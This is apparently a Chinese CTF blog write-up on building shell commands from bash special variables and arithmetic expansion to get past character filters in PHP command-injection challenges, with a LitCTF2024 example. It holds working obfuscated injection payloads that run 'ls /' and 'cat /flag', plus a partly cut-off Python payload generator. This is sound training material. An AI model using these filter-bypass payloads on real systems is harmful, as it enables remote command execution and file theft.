<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222408309.png" alt="image-20240602222408309"></p>
<p>这里生成的却是11，嘿嘿，这是怎么回事，注意看这个payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">先像上面那个1那样只去掉构造出1的+号，再看看执行结果，如下：</span><br><span class="line">$(($((~$(($((~$(())))$((~$(())))))))+$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222634293.png" alt="image-20240602222634293"></p>
<p>成功得到2，那么为什么将中间那个<code>+</code>去掉就不对了呢，个人认为是符号判定的问题，用代码表示一下去掉<code>+</code>后的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( $((~$(($((~$(())))$((~$(()))))))) $((~$(($((~$(())))$((~$(()))))))) ))</span><br></pre></td></tr></table></figure>

<p>用空格分隔了一下，注意看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))))))  已经符合一个完整的格式，会得到1，那么两个1就会得到11，这就是为什么可以得到11的原因</span><br></pre></td></tr></table></figure>

<p>那么现在来和之前生成1的payload对比一下（同样用空格分隔）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ~$(($((~$(()))) $((~$(()))))) ))</span><br></pre></td></tr></table></figure>

<p>这样并不能形成一个完整的可计算的格式，故只能类似之前那样有个<code>+</code>，所以这里的<code>+</code>号可以省略，而那个2不能。</p>
<p><strong>那么如果遇到过滤<code>+</code>号的题</strong>，2该如何构造呢，注意看：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223600280.png" alt="image-20240602223600280"></p>
<p>尝试一下构造<code>-3</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1: $((~$(())))</span><br><span class="line"></span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line">可以直接得到2，看了一下构造，应该是可以去掉+号的，尝试一下：</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))$((~$(()))))))) ,成功</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223942848.png" alt="image-20240602223942848"></p>
<p>多尝试，看构造，较重要</p>
<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>LitCTF2024 - 百万美元的诱惑</p>
<p>开题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好康的&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开胃小菜))&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的绕过，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2&amp;c=2025a</span><br></pre></td></tr></table></figure>

<p>然后给了第二关<code>/dollar.php</code>，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>正好对应这个知识点，构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-13取反为12</span><br><span class="line"></span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>直接抓包后传进去即可</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240610184944008.png" alt="image-20240610184944008"></p>
<h3 id="利用shell脚本变量构造命令"><a href="#利用shell脚本变量构造命令" class="headerlink" title="利用shell脚本变量构造命令"></a>利用shell脚本变量构造命令</h3><p>这个思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
<p><strong>探姬师傅有个项目应该是可以尝试一把梭的</strong>，好文好项目推送：<code>https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</code></p>
<p>还有bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></p>
<h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>这一板块去跟一下最早的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">文章</a>。</p>
<p><strong>这道题允许的字符串<code>$()#!&#123;&#125;&lt;\’,</code></strong></p>
<p>这里说明一下相关变量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）$# -参数数量-单独使用结果为0</span><br><span class="line">（2）$&#123;##&#125; -计数变量（#）长度，这里的结果为1</span><br><span class="line">（3）$((expr)) -算术表达式</span><br><span class="line">（4）&lt;&lt;&lt; -这是Bash shell语言中的重定向符，将一个变量或者字符串重定向到命令的标准输入（即wc -w &lt;&lt;&lt; &quot;H&quot;等价于echo &quot;H&quot; | wc -w）</span><br><span class="line">（5）$&#123;!var&#125; -间接引用</span><br><span class="line">（6）$&#x27;\123&#x27; -将八进制转换为字符串文字中的字符</span><br><span class="line">（7）&#123;a,b&#125; -花括号扩展</span><br></pre></td></tr></table></figure>

<p><strong>这里补充说明一下</strong>：</p>
<ul>
<li>对（5）的间接引用的说明，直接给shell测试代码：</li>
</ul>
<p>haha.sh:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=&quot;hello&quot;</span><br><span class="line">var2=&quot;var1&quot;</span><br><span class="line">echo $&#123;!var2&#125;</span><br></pre></td></tr></table></figure>

<p>再运行：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603023300478.png" alt="image-20240603023300478"></p>
<p>可以看到这里输出的是hello，这就是间接引用的定义。</p>
<ul>
<li>对（6）的补充说明，如下：</li>
</ul>
<p>一个小小的前置知识，看完理解一下就行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls ==》 $&#x27;\154&#x27;$&#x27;\163&#x27; 这样是可以直接使用的</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603153444204.png" alt="image-20240603153444204"></p>
<p>就是<code>$&#39;&#39;</code>会直接执行生成，所以交给编译器的是ls，也就会执行。</p>
<p><strong>再进行组合运用一下：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;)) - 1左移1，结果为2 位运算，与二进制的运算相关</span><br><span class="line">$&#123;!#&#125; - 执行 bash（因为第一个参数是 /bin/bash），可以在本地输出看看</span><br><span class="line">$((2#100)) -将二进制转换为十进制</span><br></pre></td></tr></table></figure>



<h5 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h5><p>先尝试<code>ls</code>，**<code>l</code>对应八进制为0154，<code>s</code>对应的八进制为0163。**</p>
<p><strong>先用八进制表示，<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现<code>$&#39;\154\163&#39;</code>也可以表示<code>ls</code>，</strong>这里先跟文章，然后再尝试自己构造发现的同样表示ls的方法。</p>
<p>注意组合运用那里<code>$((2#100))</code>可以将二进制100转换为十进制数4，采用这个思路来构造出整数，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br></pre></td></tr></table></figure>

<p>那么现在就用<code>$#</code>（0）和<code>$</code>（1）来替换里面的数字，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 ：$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#</span><br><span class="line">163二进制数 ：$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以构造出二进制的数。</p>
<p>那么此时就需要构造出前面的2，<strong>此时再看组合运用那里</strong>，<code>$(($&lt;&lt;$))</code>这样不就构造出2了吗，最终效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">同理</span><br><span class="line">163：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br></pre></td></tr></table></figure>

<p>这时再套入<code>$&#39;&#39;</code>，即（<code>$&#39;\154&#39;$&#39;\163&#39;</code>），如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先看正常包裹：</span><br><span class="line">$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))&#x27;$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))&#x27;</span><br><span class="line">这样并不能成功，请注意。估计就是套外面的特殊符号被当作字符串从而转义了，这里就需要在特殊符号前面加一个\防止被转义。</span><br><span class="line">那么再次尝试如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">输出看看</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125450576.png" alt="image-20240603125450576"></p>
<p>但是注意，这个构造出来的<code>$&#39;\154&#39;$&#39;\163&#39;</code><strong>只会被当做字符串，并不会被当作命令执行再次执行从而形成ls</strong>，也就是说这里的<code>$&#39;&#39;</code>并没有起作用，本来它可以自己执行从而生成ls的，为什么不继续解析可以看看这个<a href="https://www.freebuf.com/articles/system/361101.html">文章</a>，可以在终端直接传，结果如下：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125825756.png" alt="image-20240603125825756"></p>
<p>显示没有这个命令，那么此时我们就需要将这个传入bash使得这个被解析为<code>ls</code>，<strong>这次就可以利用到<code>&lt;&lt;&lt;</code>这个重定向符</strong>，如下格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p>这样就可以成功构造出ls，再传入的时候就可以被执行，但是这道题这里要求无字母，此时就<strong>可以用到间接扩展<code>$0</code>，单独使用在linux中对应bash</strong>，但是这道题不能有数字，看组合运用那里，就可以像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;!#&#125; &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p>很怪的就是本地测试当中<code>bash&lt;&lt;&lt;.....</code>可以执行，但是<code>$0</code>和<code>$&#123;!#&#125;</code>都不能成功执行，报错如下：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603135658082.png" alt="image-20240603135658082"></p>
<p><strong>怪？？？，怎么回事，可能是宝塔linux环境的问题吧，多尝试，注意看题目要求。</strong></p>
<p>这里再用centos跑一下：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204933409.png" alt="image-20240603204933409"></p>
<p>成功，这样就可以构造出没有数字字母的<code>ls</code>的payload了。</p>
<p><strong>那么继续深入</strong>，比如读flag（<code>cat /flag</code>）或者查看根目录（<code>ls /</code>），<strong>尝试直接利用</strong>一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt; $&#x27;\154\163\40\57&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603141433189.png" alt="image-20240603141433189"></p>
<p>注意看，这里构造出来后被<code>ls /</code>被当作了整个字符串处理，而不是命令，这是怎么回事，<strong>这是因为<code>bash</code>是用空格分隔参数，这个方法（<code>$&#39;&#39;</code>）处理完的结果会导致整个结果都被当做了字符串（包括这里的空格）</strong>，这就导致了不能被正常解析为命令。解决方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要先给bash来参数分离一下，</span><br><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;   </span><br><span class="line">即可成功执行，还有问题的话就如这种格式尝试&#123;ls,/&#125;，注意&#123;ls,/&#125;也不能像之前ls那样直接利用，与ls /同样的问题。</span><br></pre></td></tr></table></figure>



<p><strong>再来看看文章的问题</strong></p>
<p>在传入时有效的做到了以下几点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls -l&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>却报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: line 1: ls -l: command not found</span><br></pre></td></tr></table></figure>

<p>看到这里我测试了一下，如下传参是可以执行的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;ls /&quot;</span><br></pre></td></tr></table></figure>

<p>我就在想为什么要这样在里面套一对单引号，本来以为是多此一举，想了一下，可能是构造出来的payload在转化完后就是这样的，事实胜于雄辩，直接构造一下看看结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /  ：$&#x27;\154\163\40\57&#x27;  这次这样构造一下</span><br><span class="line">相对应的二进制数为：0b10011010，0b10100011，0b101000 和 0b111001</span><br><span class="line">分别为 $&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$# $&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125; $&#123;##&#125;$#$&#123;##&#125;$#$#$# $&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;</span><br><span class="line">再二进制转十进制，如下：</span><br><span class="line">2:   $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))</span><br><span class="line">154: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">163: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">40:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))</span><br><span class="line">57:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))</span><br></pre></td></tr></table></figure>

<p>那么现在如下构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先完成最前面提出的问题，试试$&#x27;\154\163&#x27;能不能使用，如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">结合前面的问题，如下测试：</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;  成功执行ls</span><br><span class="line"></span><br><span class="line">同时注意bash&lt;&lt;&lt;&quot;&#x27;ls&#x27;&quot; 也是可以执行的</span><br></pre></td></tr></table></figure>

<p>这里说明了<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现的<code>$&#39;\154\163&#39;</code>都是可用的，虽然本来就是一样的。</p>
<p>现在回到原先的问题，刚好证明了，这里使用更简单的构造，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603150736801.png" alt="image-20240603150736801"></p>
<p>这个事实就可以充分地说明在这个构造方法中最终利用的payload确实是如文章所说：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls /&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>现在结合事实再来想想</strong>，估计就是因为在上面说过的最后结果会被当做字符串，这里为了与shell命令区分开，所以是<code>bash&lt;&lt;&lt;&quot;&#39;ls /&#39;&quot;</code>，中间的单引号表示的就是这是一个字符串，注意思考，区分<code>bash&lt;&lt;&lt;&quot;ls /&quot;</code>这两者的不同</p>
<p><strong>那现在就继续跟文章</strong></p>
<p>而出现这个结果的原因应该还是字符串问题，<strong>这阻止了<code>bash</code>用空格分隔参数，</strong></p>
<p>我们只需使用上述方法运行<code>bash -c</code>，并将最终命令作为参数。这样，<strong>第二次 bash 调用就会进行参数分离</strong>。</p>
<p>为了在<code>bash</code>和之间放置空格字符<code>-c</code>，我们使用括号扩展：<code>&#123;bash,-c&#125;</code>。这会扩展为带有空格的字符串。</p>
<p>最终构造地paylaod：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&#123;bash，-c，ls -l&#125;</span><br></pre></td></tr></table></figure>

<p><strong>那么发散一下，也就是再调用一下bash嘛，那么我尝试再用一次<code>&lt;&lt;&lt;</code>呢</strong>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br><span class="line">注意防止转义</span><br></pre></td></tr></table></figure>

<p>成功执行，<strong>同时注意主要还是用这个</strong></p>
<h4 id="其它的利用"><a href="#其它的利用" class="headerlink" title="其它的利用"></a>其它的利用</h4><p>其他的博主由此也提出了新的利用方法，参考<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-1">文章</a></p>
<h5 id="shell脚本中-的多种用法"><a href="#shell脚本中-的多种用法" class="headerlink" title="shell脚本中$的多种用法"></a>shell脚本中$的多种用法</h5><p>shell脚本中<code>$</code>的多种用法（例子可参考<a href="https://blog.csdn.net/ly_qiu/article/details/105765772">文章</a>）：</p>
<table>
<thead>
<tr>
<th>变量名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>$0</td>
<td>脚本本身的名字</td>
</tr>
<tr>
<td>$1</td>
<td>脚本后所输入的第一串字符</td>
</tr>
<tr>
<td>$2</td>
<td>传递给该shell脚本的第二个参数</td>
</tr>
<tr>
<td>$*</td>
<td>脚本后所输入的所有字符</td>
</tr>
<tr>
<td>$@</td>
<td>脚本后所输入的所有字符</td>
</tr>
<tr>
<td>$_</td>
<td>表示上一个命令的最后一个参数</td>
</tr>
<tr>
<td>$#</td>
<td>#脚本后所输入的字符串个数</td>
</tr>
<tr>
<td>$$</td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td>$!</td>
<td>表示最后执行的后台命令的PID</td>
</tr>
<tr>
<td>$?</td>
<td>显示最后命令的退出状态，0表示没有错误，其他表示有错误</td>
</tr>
</tbody></table>
<h5 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用<code>$#</code>构造</h5><p>本质就是和上面启程部分说的那个一样，但是有可能<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来，可以将其换一种形式：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165448778.png" alt="image-20240603165448778"></p>
<p>加了变量$__作为过渡，减少了解析的过程。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p>可以使用的脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span 